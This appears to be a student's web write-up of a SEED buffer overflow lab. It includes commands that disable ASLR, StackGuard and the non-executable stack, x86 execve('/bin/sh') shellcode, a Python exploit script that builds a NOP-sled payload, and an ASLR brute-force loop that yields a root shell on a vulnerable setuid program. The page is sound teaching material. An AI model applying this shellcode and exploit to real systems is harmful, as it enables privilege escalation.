@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Module 4 Lab: Buffer Overflow #  1 Overview #  Learning Objective:
+Students will gain first hand experience of the buffer overflow vulnerability. Buffer overflow is when a program attempts to write data beyond the boundary of the space allocated for it in a fixed length buffer. The overwritten code, can be formatted in a way that the return address of the function points to malicious code.
+This lab covers the following topics:">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Buffer Overflow Vulnerability" />
+<meta property="og:description" content="Module 4 Lab: Buffer Overflow #  1 Overview #  Learning Objective:
+Students will gain first hand experience of the buffer overflow vulnerability. Buffer overflow is when a program attempts to write data beyond the boundary of the space allocated for it in a fixed length buffer. The overwritten code, can be formatted in a way that the return address of the function points to malicious code.
+This lab covers the following topics:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/docs/Classes/Computer-System-Security/Labmodule4/" /><meta property="article:section" content="docs" />
+
+
+
+<title>Buffer Overflow Vulnerability | AlexSullivan.me</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.6c7c6446dfdee7c8c933e9bbc6e80ee3ed6c913b2a59519f2092c3c6a9d63e55.css" integrity="sha256-bHxkRt/e58jJM&#43;m7xugO4&#43;1skTsqWVGfIJLDxqnWPlU=">
+<script defer src="/en.search.min.773ef9bd98b70106d672f1a1f08e8d5eb58b99deba2dcbc7d2a8f5deb423ffdb.js" integrity="sha256-dz75vZi3AQbWcvGh8I6NXrWLmd66LcvH0qj13rQj/9s="></script>
+
+<script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk="></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+</head>
+
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><span>AlexSullivan.me</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/" class="">Classes</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-52d5595dc24a501967770b34cf1afb5a" class="toggle" checked />
+    <label for="section-52d5595dc24a501967770b34cf1afb5a" class="flex justify-between">
+      <a  class="">Computer System Security</a>
+      <span>▾</span>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Computer-System-Security/Labmodule4/" class=" active">Buffer Overflow Vulnerability</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Computer-System-Security/envVariables/" class="">Env Variables</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Computer-System-Security/Format-String-Vulnerability/" class="">Format String Vulnerability</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Computer-System-Security/Lab-Module-3-Shellshock-Attack/" class="">Shell Shock Attack</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-27757b15399f596f50859475191c30a5" class="toggle"  />
+    <label for="section-27757b15399f596f50859475191c30a5" class="flex justify-between">
+      <a  class="">Human Computer Interaction</a>
+      <span>▾</span>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Human-Computer-Interaction/ConsideringCognition/" class="">Considering Cognition</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-db6dfb8212facb60c852484abfed6e6f" class="toggle"  />
+    <label for="section-db6dfb8212facb60c852484abfed6e6f" class="flex justify-between">
+      <a  class="">Algorithms</a>
+      <span>▾</span>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Algorithms/Hashing/" class="">Hashing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://example.com/docs/Classes/Algorithms/balancedBST/" class="">Balanced Trees and AVL Trees</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/" >
+        Blog
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Buffer Overflow Vulnerability</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#module-4-lab-buffer-overflow"><strong>Module 4 Lab: Buffer Overflow</strong></a>
+      <ul>
+        <li><a href="#1-overview"><strong>1 	Overview</strong></a></li>
+        <li><a href="#2-lab-tasks"><strong>2 	Lab tasks</strong></a>
+          <ul>
+            <li><a href="#21-turning-off-countermeasures"><strong>2.1 	Turning Off Countermeasures</strong></a></li>
+            <li><a href="#22task-1-running-shellcode"><strong>2.2	Task 1: Running Shellcode</strong></a></li>
+            <li><a href="#23the-vulnerable-program"><strong>2.3	The Vulnerable Program</strong></a></li>
+            <li><a href="#24task-2-exploiting-the-vulnerability"><strong>2.4	Task 2: Exploiting the Vulnerability</strong></a></li>
+            <li><a href="#25task-3-defeating-dashs-countermeasure"><strong>2.5	Task 3: Defeating dash&rsquo;s Countermeasure</strong></a></li>
+            <li><a href="#26task-4-defeating-address-randomization"><strong>2.6	Task 4: Defeating Address Randomization</strong></a></li>
+            <li><a href="#27task-5-turn-on-the-stackguard-protection"><strong>2.7	Task 5: Turn on the StackGuard Protection</strong></a></li>
+            <li><a href="#28task-6-turn-on-the-non-executable-stack-protection"><strong>2.8	Task 6: Turn on the Non-executable Stack protection</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="module-4-lab-buffer-overflow">
+  <strong>Module 4 Lab: Buffer Overflow</strong>
+  <a class="anchor" href="#module-4-lab-buffer-overflow">#</a>
+</h1>
+<h2 id="1-overview">
+  <strong>1 	Overview</strong>
+  <a class="anchor" href="#1-overview">#</a>
+</h2>
+<p>Learning Objective:</p>
+<p>Students will gain first hand experience of the buffer overflow vulnerability. Buffer overflow is when  a program attempts to write data beyond the boundary of the space allocated for it in a fixed length buffer. The overwritten code, can be formatted in a way that the return address of the function points to malicious code.</p>
+<p>This lab covers the following topics:</p>
+<ul>
+<li>Buffer overflow vulnerability and attack</li>
+<li>stack layout in a function</li>
+<li>address randomization, non executable stack and StackGuard</li>
+</ul>
+<h2 id="2-lab-tasks">
+  <strong>2 	Lab tasks</strong>
+  <a class="anchor" href="#2-lab-tasks">#</a>
+</h2>
+<h3 id="21-turning-off-countermeasures">
+  <strong>2.1 	Turning Off Countermeasures</strong>
+  <a class="anchor" href="#21-turning-off-countermeasures">#</a>
+</h3>
+<p>Address Space Randomization</p>
+<p>Several linux based distros use address space randomization to randomize the starting address of th e stack and the heap. which makes guessing the address difficult, and guessing the address is one of the critical parts of the buffer overflow vulnerability. Use the following code to disable:</p>
+<p><code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
+<p>StackGuard protection</p>
+<p>A guard to prevent buffer overflow implemented with GCC. turn off with the following command during compilation:</p>
+<p><code>gcc -fno-stack-protector example.c</code></p>
+<p>Non-Executable stack</p>
+<p>In Ubuntu they now longer allow executable stacks. To make the stacks executable use the following when compiling programs:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">For executable stack:
+$ gcc -z execstack  -o test test.c
+For non-executable stack:
+$ gcc -z noexecstack  -o test test.c
+</code></pre></div><p>Configuring <code>/bin/sh</code></p>
+<p>In moderne versions of Ubuntu the <code>/bin/sh</code> program points at the newer <code>dash</code> program which has contermeasures that prevents itself from being executed in a <code>set-UID</code> program, because our victim program relies on being a <code>set-UID</code> program we need to change the shell program with the following command:</p>
+<p><code>sudo ln -sf /bin/zsh /bin/sh</code></p>
+<h3 id="22task-1-running-shellcode">
+  <strong>2.2	Task 1: Running Shellcode</strong>
+  <a class="anchor" href="#22task-1-running-shellcode">#</a>
+</h3>
+<p>Shellcode is the code used to launch a shell program similar to using <code>execve()</code> to run <code>/bin/sh</code> within a c program. The program below from the SEED lab is used to launch <code>/bin/sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* call_shellcode.c  */</span>
+
+<span style="color:#75715e">/*A program that creates a file containing code for launching shell*/</span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e">/* xorl    %eax,%eax              */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">/* pushl   %eax                   */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;//sh&#34;</span>           <span style="color:#75715e">/* pushl   $0x68732f2f            */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;/bin&#34;</span>           <span style="color:#75715e">/* pushl   $0x6e69622f            */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e">/* movl    %esp,%ebx              */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">/* pushl   %eax                   */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">/* pushl   %ebx                   */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e">/* movl    %esp,%ecx              */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">/* cdq                            */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e">/* movb    $0x0b,%al              */</span>
+  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e">/* int     $0x80                  */</span>
+;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+   <span style="color:#66d9ef">char</span> buf[<span style="color:#66d9ef">sizeof</span>(code)];
+   strcpy(buf, code);
+   ((<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)( ))buf)( );
+} 
+</code></pre></div><p>Compiling this code with <code>gcc -z execstack -o call_shellcode call_shellcode.c</code> gives the following, you can see using the <code>ps</code> command that we have one bash process and on sh process</p>
+<p>
+  <img src="/images/2-2task1.png" alt="2-2task1" /></p>
+<h3 id="23the-vulnerable-program">
+  <strong>2.3	The Vulnerable Program</strong>
+  <a class="anchor" href="#23the-vulnerable-program">#</a>
+</h3>
+<p>The program <code>stack.c</code> from SEED labs is vulnerable to a buffer overflow attack because of the call to the <code>strcpy()</code> function. We need to exploit this vulnerability and gain root privilege. When Compiling <code>stack.c</code> make sure to turn off the StackGuard and the non executable stack protections. Also make sure to make the stack program a <code>set-UID</code> program like shown below.</p>
+<p>
+  <img src="/images/2.3.png" alt="2.3" /></p>
+<p>If we try to run stack right now then we just get a segmentation fault. We need to create a bad file with the <code>exploit.c</code> program to get root access.</p>
+<h3 id="24task-2-exploiting-the-vulnerability">
+  <strong>2.4	Task 2: Exploiting the Vulnerability</strong>
+  <a class="anchor" href="#24task-2-exploiting-the-vulnerability">#</a>
+</h3>
+<p>To exploit the vulnerability within the <code>stack</code> program we need to overflow the buffer and over write the return address of the <code>foo</code> functions stack frame, to point to or own malicious shellcode. In order to not have to just guess where the return address is I am going to re compile with gdb turned on in order to step through the program.</p>
+<p>By creating a breakpoint in the program, at the function where the <code>strcpy()</code> function is we can use gdb to print out the return address. We know that in x86 architecture that the frame pointer is stored in the ebp register and we can print out that register in gdb by doing the following command:</p>
+<p>
+  <img src="/images/gedebp.png" alt="gedebp" /></p>
+<p>We can see the address of the buffer with gdb as well  like so:</p>
+<p>
+  <img src="/images/gdbbuffer.png" alt="gdbbuffer" /></p>
+<p>
+  <img src="/images/bufferpicture.png" alt="bufferpicture" /></p>
+<p>Here is the contents of my <code>exploit.py</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">import</span> sys
+
+shellcode<span style="color:#f92672">=</span> (
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># xorl    %eax,%eax</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># pushl   %eax</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;//sh&#34;</span>  <span style="color:#75715e"># pushl   $0x68732f2f</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;/bin&#34;</span>  <span style="color:#75715e"># pushl   $0x6e69622f</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># movl    %esp,%ebx</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># pushl   %eax</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># pushl   %ebx</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># movl    %esp,%ecx</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># cdq</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># movb    $0x0b,%al</span>
+   <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># int     $0x80</span>
+)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
+
+
+<span style="color:#75715e"># Fill the content with NOP&#39;s</span>
+content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>)) 
+
+<span style="color:#75715e"># Put the shellcode at the end</span>
+start <span style="color:#f92672">=</span> <span style="color:#ae81ff">517</span> <span style="color:#f92672">-</span> len(shellcode) 
+content[start:] <span style="color:#f92672">=</span> shellcode
+
+<span style="color:#75715e">##################################################################</span>
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbfffeb18</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">120</span>   <span style="color:#75715e"># replace 0xAABBCCDD with the correct value</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>            <span style="color:#75715e"># replace 0 with the correct value</span>
+
+content[offset:offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (ret)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>,byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>) 
+<span style="color:#75715e">##################################################################</span>
+
+<span style="color:#75715e"># Write the content to a file</span>
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;badfile&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+  f<span style="color:#f92672">.</span>write(content)
+</code></pre></div><p>Notice that return address has been pushed forward 120 bytes, this is because when stack is run with gdb the stack frame may not be exactly the same as when gdb is turned off. This doesn&rsquo;t change very much because most of the bad file is just filled with <code>0x90</code> or the <code>NOP</code> command. Notice the offset it the 36 bytes from the end of the buffer to the return address.</p>
+<p>When I run the <code>exploit.py</code> script then a bad file is generated, which gives me access to the root shell when <code>stack</code> is run. Shown below:</p>
+<p>
+  <img src="/images/2-4rootshell.png" alt="2-4rootshell" /></p>
+<h3 id="25task-3-defeating-dashs-countermeasure">
+  <strong>2.5	Task 3: Defeating dash&rsquo;s Countermeasure</strong>
+  <a class="anchor" href="#25task-3-defeating-dashs-countermeasure">#</a>
+</h3>
+<p><code>dash</code> drops the privileges when the effective UID does not match the real UID, but this countermeasure can be defeated by not using the <code>/bin/sh</code> in the shellcode, and instead use a different shellcode.</p>
+<p>First we need to change back the symbolic link between <code>/bin/sh</code> and <code>dash</code> with the following command:</p>
+<p><code>sudo ln -sf /bin/dash /bin/sh</code></p>
+<p>Within the <code>dash_shell_test.c</code> program there is a line to set the user id to 0, or the root user id. When you run the program with that line commented out, you only get a normal shell. However when run again with the <code>setuid(0);</code> line uncommented then we get the root shell, which means our shellcode can be changed to get around the dash counter measure.</p>
+<p>I then went and changed the shellcode with <code>exploit.py</code> to the updated shellcode from the lab description. After running the exploit script again I was able to get another root shell with dash being used.</p>
+<p>
+  <img src="/images/2-5root.png" alt="2-5root" /></p>
+<h3 id="26task-4-defeating-address-randomization">
+  <strong>2.6	Task 4: Defeating Address Randomization</strong>
+  <a class="anchor" href="#26task-4-defeating-address-randomization">#</a>
+</h3>
+<p>In order to try and defeat the address Randomization we need to turn that counter measure back on:</p>
+<p><code>sudo /sbin/sysctl -w kernel.randomize_va_space=2</code></p>
+<p>On 32 bit linux machines the stack only has 19 bits of entropy. Meaning there is only 
+<link rel="stylesheet" href="/katex/katex.min.css" />
+<script defer src="/katex/katex.min.js"></script>
+<script defer src="/katex/auto-render.min.js" onload="renderMathInElement(document.body);"></script><span>
+  \( 2^{19} = 524,288 \)
+</span>
+ possibilities. This can be defeated by brute force, with the following bash script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>SECONDS<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+value<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>
+	<span style="color:#66d9ef">do</span>
+	value<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span> $value <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">))</span>
+	duration<span style="color:#f92672">=</span>$SECONDS
+	min<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>$duration <span style="color:#f92672">/</span> <span style="color:#ae81ff">60</span><span style="color:#66d9ef">))</span>
+	sec<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>$duration <span style="color:#f92672">%</span> <span style="color:#ae81ff">60</span><span style="color:#66d9ef">))</span>
+	echo <span style="color:#e6db74">&#34;</span>$min<span style="color:#e6db74"> minutes and </span>$sec<span style="color:#e6db74"> seconds elapsed.&#34;</span>
+	echo <span style="color:#e6db74">&#34;The program has been running </span>$value<span style="color:#e6db74"> times so far.&#34;</span>
+	./stack
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>After Letting the script run for a little while I was able to get the root shell, it took about 24,687 times shown here:</p>
+<p>
+  <img src="/images/bruteforce.png" alt="bruteforce" /></p>
+<h3 id="27task-5-turn-on-the-stackguard-protection">
+  <strong>2.7	Task 5: Turn on the StackGuard Protection</strong>
+  <a class="anchor" href="#27task-5-turn-on-the-stackguard-protection">#</a>
+</h3>
+<p>Make sure to turn of the address randomization before attempting this or else you wont know what stopped your attack from working.</p>
+<p>Now I need to recompile <code>stack.c</code> with the stack protections on like this:</p>
+<p><code>gcc  -o stack -z execstack  stack.c</code></p>
+<p>
+  <img src="/images/stackGurad.png" alt="stackGurad" /></p>
+<p>As you can see above the attack no longer works because the StackGuard has detected that the stack has been smashed and automatically aborts the program.</p>
+<h3 id="28task-6-turn-on-the-non-executable-stack-protection">
+  <strong>2.8	Task 6: Turn on the Non-executable Stack protection</strong>
+  <a class="anchor" href="#28task-6-turn-on-the-non-executable-stack-protection">#</a>
+</h3>
+<p>First we need to recompile the vulnerable <code>stack.c</code> program to  to use the non executable stack protection with the following command:</p>
+<p><code>gcc -o stack -fno-stack-protector -z noexecstack stack.c</code></p>
+<p>When I try to run the vulnerable program again I get a segmentation fault, because this protection makes it so that I can not execute the code on the stack, making it impossible to run the shellcode that was injected from the <code>badfile</code>. However this does not prevent a buffer overflow from actually occurring.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#module-4-lab-buffer-overflow"><strong>Module 4 Lab: Buffer Overflow</strong></a>
+      <ul>
+        <li><a href="#1-overview"><strong>1 	Overview</strong></a></li>
+        <li><a href="#2-lab-tasks"><strong>2 	Lab tasks</strong></a>
+          <ul>
+            <li><a href="#21-turning-off-countermeasures"><strong>2.1 	Turning Off Countermeasures</strong></a></li>
+            <li><a href="#22task-1-running-shellcode"><strong>2.2	Task 1: Running Shellcode</strong></a></li>
+            <li><a href="#23the-vulnerable-program"><strong>2.3	The Vulnerable Program</strong></a></li>
+            <li><a href="#24task-2-exploiting-the-vulnerability"><strong>2.4	Task 2: Exploiting the Vulnerability</strong></a></li>
+            <li><a href="#25task-3-defeating-dashs-countermeasure"><strong>2.5	Task 3: Defeating dash&rsquo;s Countermeasure</strong></a></li>
+            <li><a href="#26task-4-defeating-address-randomization"><strong>2.6	Task 4: Defeating Address Randomization</strong></a></li>
+            <li><a href="#27task-5-turn-on-the-stackguard-protection"><strong>2.7	Task 5: Turn on the StackGuard Protection</strong></a></li>
+            <li><a href="#28task-6-turn-on-the-non-executable-stack-protection"><strong>2.8	Task 6: Turn on the Non-executable Stack protection</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
